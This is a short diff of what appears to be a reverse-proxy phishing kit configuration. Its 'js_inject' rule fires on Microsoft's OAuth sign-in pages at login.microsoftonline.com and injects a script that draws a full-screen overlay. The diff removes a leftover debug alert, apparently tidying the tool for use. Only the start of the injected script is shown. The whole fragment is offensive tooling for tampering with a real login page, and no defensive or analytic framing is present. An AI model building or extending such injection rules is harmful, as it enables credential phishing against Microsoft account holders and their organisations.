@@ -54,8 +54,6 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
     script: |
-      alert("i am here hhhhgggggggg");
-
       const overlay = document.createElement("div");
       overlay.style.position = "fixed";
       overlay.style.top = "0";
